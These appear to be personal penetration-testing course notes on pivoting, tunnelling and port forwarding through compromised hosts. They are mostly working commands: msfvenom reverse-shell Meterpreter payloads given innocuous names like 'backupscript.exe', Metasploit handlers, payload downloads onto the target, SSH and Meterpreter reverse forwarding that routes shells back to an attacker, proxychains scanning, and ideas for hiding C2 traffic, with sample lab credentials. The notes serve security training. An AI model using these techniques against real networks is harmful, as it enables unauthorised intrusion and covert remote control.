*Pivoting* is using a compromised machine to move to other networks through the compromised device.

Terms to describe compromised host used to *pivot* to a previously unreachable network.
- `Pivot Host`
- `Proxy`
- `Foothold`
- `Beach Head system`
- `Jump Host`

Used to defeat segmentation. Whereas *tunelling* is to encapsulate network traffic into another protocol and route traffic through it.

## Comparing Lateral Movement, Pivoting and Tunelling
### Lateral Movement
*Lateral Movement* is the technique used to further our access to additional `hosts`, `applications` and `services`.

Lateral movement can also help us gain access to specific domain resources we may need to elevate our privileges. This can often enable privilege
```
During an assessment, we gained initial access to the target environment and were able to gain control of the local administrator account. We performed a network scan and found three more Windows hosts in the network. We attempted to use the same local administrator credentials, and one of those devices shared the same administrator account. We used the credentials to move laterally to that other device, enabling us to compromise the domain further.
```

### Pivoting
Utilizing multiple hosts to cross `network` boundaries that we would not usually have access to. The goal is to move deeper into a network by compromising target host and infrastructure.

```
During one tricky engagement, the target had their network physically and logically separated. This separation made it difficult for us to move around and complete our objectives. We had to search the network and compromise a host that turned out to be the engineering workstation used to maintain and monitor equipment in the operational environment, submit reports, and perform other administrative duties in the enterprise environment. That host turned out to be dual-homed (having more than one physical NIC connected to different networks). Without it having access to both enterprise and operational networks, we would not have been able to pivot as we needed to complete our assessment.
```

_Look out for multiple nics?_ 

### Tunneling
Where we use common services and protocols to disguise traffic. (eg using HTTP to communicate with C&C Server). Obfuscation and Detection Avoidance.

```
One way we used Tunneling was to craft our traffic to hide in HTTP and HTTPS. This is a common way we maintained Command and Control (C2) of the hosts we had compromised within a network. We masked our instructions inside GET and POST requests that appeared as normal traffic and, to the untrained eye, would look like a web request or response to any old website. If the packet were formed properly, it would be forwarded to our Control server. If it were not, it would be redirected to another website, potentially throwing off the defender checking it out.
```


## The Network Behind Pivoting
### IP Addressing & NICs
Every computer communicating on a network needs an *IP*. *IP*s are usually obtained dynamically from a *DHCP* server. *IP* addresses can be static and commonly seen with:
- Servers
- Routers
- Switch virtual interfaces
- Printers
- And any devices that are providing critical services to the network

IP address assigned directly to *NIC* (`Network Interface Card`).
Always important to check for additional *NIC*s with
	`ifconfig` `Unix`
	`ipconfig` `Windows`

##### ifconfig
each NIC has an identifier (`eth`, `lo`, `tun0`)
- `tun0` Indicated a VPN

##### ipconfig
when network traffic is destined for an ip located on a different network, the computer will send traffic to its assigned *default gateway*

### Routing
`netstart -r` or `ip route`

Defining characteristic of a router is that it has a routing table that it uses to forward traffic based on the destination IP address.

*Routing Table* assists the system to make routing decisions. When a packet is created and has a destination before it leaves the computer, the routing table decides where to send it.
Any traffic destined for networks and not present in routing table will be sent to the default route. 

### Protocols, Services and Ports
*Protocols* are the rules that govern network communications. Many protocols have corresponding *ports* that act as identifiers.
An open *port* corresponds to an application we may be able to connect to.

## Dynamic Port Forwarding with SSH and SOCKS Tunelling
### Port Fowarding in Context
*Port Forwarding* is a technique that allows us to redirect a communication request from one port to another. 
*Port Forwarding* uses `TCP` as the primary communication layer. Different layers can be used to encapsulate forwarded traffic `SSH`, [[Definitions#SOCKS|SOCKS]]

### SSH Local Port Forwarding
![[SSH.png]]

If a service with an `SSH` port is open we can either request services directly from the open port or via `SSH`.

***EG***
```shell-session
PORT     STATE  SERVICE
22/tcp   open   ssh
3306/tcp closed mysql
```

We can either directly connect to `mysql` through `tcp 3306` or `SSH` into the machine and forward port `tcp 3306` to a port on our local machine eg:1234 via `SSH`
```
ssh -L 1234:localhost:3306 ubuntu@externalhost

ssh -L localport:localhost:externalporttoforward hostname@externalhost
```
*We can forward multiple ports at once*
We can then confirm the forwarded port with netstat
```
netstat -antp
```
### Setting up to Pivot
If we check `ifconfig` on linux host we can view if a server has multiple `NiCs` 
we can identify `Nics` from `ens` and loopback interfaces with `lo`.

We dont know which services lie on the other side of the pivot point. 
We need to scan the ip addresses which lie on the opposite side but we must first establish a route with dynamic port forwarding and pivot our network packets via the compromised server.

We cannot perform this scan directly from our attack host because it does not have roots to the network.

We can do this by starting a *SOCKS Listener* on our *localhost* and then configure `SSH` to forward that traffic via `SSH` to the alternate network after connecting to the target host.

This is called *SSH Tunelling* over *Socks Proxy*.

`SOCKS` stands for *Socket Secure*, a protocol that helps communicate with servers where you have firewall restrictions in place. 
in `SOCKS` the initial network traffic is generated  by the `SOCKS` client which then connects to the `SOCKS` server controlled by the user who wants to access a server on the client-side. Once connection is established, network traffic can be routed through the `SOCKS` server on behalf of the connected client.

This technique is used to circumvent restrictions put in place by firewalls, and allow an external entity to bypass a firewall and access a service in a fire-walled environment.
`SOCKS` proxies can pivot via creating a route to an external server from *NAT Networks*.

`SOCKS` proxies are currently of two types: `SOCKS4` and `SOCKs5`.
	`SOCKS4` doesn't provide any authentication and `UDP` support
	`SOCKS5` does. 

![[Pasted image 20250106051458.png]]

- Attack Host starts `SSH Client` and requests the `SSH Server` to allow it to send `TCP` data over `SSH` socket.
- `SSH Server` acknowledges and `SSH Client` then starts listening on *localhost:9050*
- Whatever data sent to *localhost:9050* will be broadcast to entire network over `SSH`

### Enabling Dynamic Port Forwarding with SSH
```shell-session
ssh -D 9050 ubuntu@10.129.202.64
```

`-D` argument requests `SSH` server to enable dynamic port forwarding.
Once enabled we need to use *proxychains* to route any tools packets over port `tcp 9050`.

*Proxychains* can route `TCP` connections through `SOCKS`, `TOR` and `HTTP/HTTPS`.

Using *Proxychains* we can hide the IP of our requesting host as the receiving host will only see the IP of our pivot machine.

*Proxychains* is often used to force an application's `TCP traffic` to go through hosted proxies like `SOCKS4`/`SOCKS5`, `TOR`, or `HTTP`/`HTTPS` proxies.

##### /etc/proxychains.conf

### Using Nmap with Proxychains
To use *proxychains* we just supersede any program with `proxychains`
*Proxychains* default port is `9050`

```shell-session
proxychains nmap -v -sn 172.16.5.1-200
```
`-sn` is a host discovery with no specified ports.


this is called *Socks Tunelling*.
We can only perform a *full TCP connect* (`nmap -sT`) scan over *proxychains* as it cannot understand partial packets and therefore cannot understand *UDP* scans.

*host-alive* checks may not work against windows targets as the Windows Defender Firewall blocks `ICMP` requests (*Pings*) by default.


### Enumerating the Windows Target with Proxychains
proxychains nmap -v -sn IP

```
proxychains nmap -v -Pn -sT IP
```
`-v verbose`
### Using Metasploit with Proxychains
```
proxychains msfconsole
```

### Using Xfreerdp with proxychains
```shell-session
	proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

***Always scan for RDP with metasploit, Service can be called something else***


## Remote/Reverse Port Forwarding with SSH
The image below shows a scenario where we can `RDP` into the windows host A. Its possible as in the previous example to pivot into the windows host via the Ubuntu host.
![[Pasted image 20250107035147.png]]
The outgoing connection to the windows host is limited to the internal network 172.16.5.0/23 and we do not have a direct connection. If we start a Metasploit listener and try and get a reverse shell it will not connect directly to us as we are not on the internal network.
	We may need to *upload/download* files, use *exploits* or *low level windows API* using *meterpreter* to perform enumeration on the machine which may not be possible with *LOTL*

In these cases we need to find a pivot host which is a connection point between our attack host and our windows server.

To gain a *Meterpreter shell* on the windows machine we need to create a `HTTPS` payload with `msfvenom` and change the configuration for the reverse connection to be the Pivot hosts IP.
We will then use port `tcp 8080` on the Pivot host to forward all our packets to our attack hosts 8000 port where metasploit is listening.

### Creating a payload with MSFvenom
```shell-session
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```

### Configuring and starting the multi handler
```shell-session
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 8000
run
```
Once our payload is created and our listener is configured and running. We can copy the payload to the Ubuntu server with the `scp` command since we have the `SSH` credentials.
### Transferring Payload to Windows Host
```shell-session
scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
```

After copying we start a *python 3* http server in the same folder we copy our payload

```
python3 -m http.server 8123 
```

We can then download on the windows machine
```powershell-session
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

Once we have the file downloaded to the windows host we will use *ssh remote port forwarding* to forward connections from the ubuntu servers port 8080 to our msfconsole listener on 8000.

`-vN` Verbose
`-R` asks Ubuntu server to listen on *targetIPaddress*:8080 and forward all incoming ports to connections on port `tcp 8080` to our attack host on `tcp 8000`

```shell-session
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

### Session Established
Our *meterpreter* session should then accept that our incoming connection is from localhost:8000 since we are recieving data over our `local SSH Socket` .

![[Pasted image 20250107044042.png]]

## Meterpreter Tunneling and Port Forwarding
If we have a scenario where we have *Meterpreter* shell access on the Linux pivot host and we want to perform enumeration scans through the pivot host, but we want to take advantage of the conveniences the *meterpreter* session brings. 

In these cases we can still create a pivot with our *meterpreter* session without relying on `SSH` port forwarding 

### Creating Payload for Ubuntu Pivot Host
```shell-session
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
```

We then need to start a `multi/handler` on *Metasploit*
```shell-session
use exploit/multi/handler
```

We can then copy the `backupjob` binary over to the pivot host with `scp` or a `http` server.
We must also make it executable with `chmod +x`

We know the windows target is on the `172.16.5.0/23` assuming the windows firewall is allowing `ICMP` requests we would want to perform a ping sweep on the network, which we can do using the *meterpreter* `ping_sweep` module.

```shell-session
 run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

We can also perform a ping sweep directly on the target machine with a for loop

##### Ping Sweep for Loop on Linux Pivot Hosts
```shell-session
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

##### Ping Sweep for loop on CMD
```cmd-session
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

##### Ping Sweep for loop on Powershell
```powershell-session
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
```

***Always  ping sweep twice to ensure arp cache gets built***
If a hosts firewall blocks `ICMP` requests in these cases we can perform a `TCP` scan on `172.16.5.0/23` with Nmap. 
Instead of port forwarding we can use *Metasploit's* post-exploitation routing module `socks_proxy` to configure a local proxy on our attack host.
We will configure the `SOCKS` proxy for *SOCKS version 4a*.
This will start a listener on port *9050* and route all traffic received by our *meterpreter* session.

### Configuring MSF's Socks Proxy
```shell-session
msf6 > use auxiliary/server/socks_proxy

msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
version => 4a
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.
```

#### Confirming Proxy is running
```shell-session
msf6 auxiliary(server/socks_proxy) > jobs
```

#### Creating Routes
We need to tell our socks proxy to route all traffic via our *meterpreter* session. We can use the *post/multi/manage/autoroute* module from *Metasploit* to add routes for the `172.16.5.0`  subnet and then route all our *proxychains* traffic.

#### Autoroute
```shell-session
msf6 > use post/multi/manage/autoroute

msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
SUBNET => 172.16.5.0
msf6 post(multi/manage/autoroute) > run
```

It is also possible to add routes with *autoroute* from the *meterpreter* session.

```shell-session
run autoroute -s 172.16.5.0/23
```

We can then use `-p` to list active routes and make sure our configuration is successful.

```
run autoroute -p
```

We will now be able to use *proxychains* to route our *NMAP* traffic over `tcp 9050`

```shell-session
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```

### Port Forwarding
Port forwarding can also be accomplished with *Metasploits* `portfwd` module.

We can enable a listener on our attack host and request *Meterpreter* to forward all packets recieved on this port via our *meterpreter* session to a remote host on the `172.16.5.0/23` network.
```shell-session
help portfwd
```

#### Creating Local TCP Relay
```shell-session
portfwd add -l 3300 -p 3389 -r 172.16.5.19
```

The above command requests the *meterpreter* shell to start a listener on our attack hosts local `-l` port `tcp 3300` and forward all the packets to the remote `-r` windows server `172.16.5.19` on port `tcp 3389` `-p` via our *meterpreter* session.

Now if we execute *xfreerdp* on our local session on port `tcp 3300` we will connect to the remote windows server's `rdp` port `tcp 3389` 

```shell-session
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```


### Meterpreter Reverse Port Forwarding
*meterpreter* can also perform *Reverse Port Forwarding*.
*Reversed port forwarding* is when we want to listen in on a specific port on the compromised server and forward all incoming shells from the *pivot host* to our attack server.

We start a listener on a new port on our attack host `tcp 8081` and request all traffic the *pivot host* receives on port `tcp 1234` to our listener on `tcp 8081`.

We can create a reverse port forward on our existing shell using the command below
```shell-session
portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```

#### Configuring Multi Handler
```shell-session
meterpreter > bg

[*] Backgrounding session 1...
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 8081 
LPORT => 8081
msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:8081 
```

We can now create a reverse shell payload that will send a connection back to our *Pivot server* on `172.16.5.129:1234` when executed on our *windows host*. 
Once our *Pivot server* receives this connection, it will forward that to `attack host's ip`:`8081` that we configured.

```shell-session
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
```

Finally we can execute the payload on the *Windows Server* we will receive a shell from Windows via our *Pivot Host*. 

## Socat Redirection with a Reverse Shell
